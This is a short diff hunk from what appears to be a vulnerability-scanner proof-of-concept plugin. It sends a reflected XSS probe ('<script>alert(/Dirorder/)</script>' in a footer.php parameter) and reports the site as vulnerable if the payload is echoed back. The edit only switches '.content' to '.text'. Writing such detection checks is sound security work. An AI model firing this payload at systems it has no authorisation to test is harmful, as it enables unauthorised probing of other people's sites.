@@ -53,7 +53,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             vul_url = arg + \
                 '/includes/footer.php?this_year=<script>alert(/Dirorder/)</script>'
-            response = requests.get(vul_url, timeout=5).content
+            response = requests.get(vul_url, timeout=5).text
             if type == 'xss' and '>alert(/Dirorder/)<' in response:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
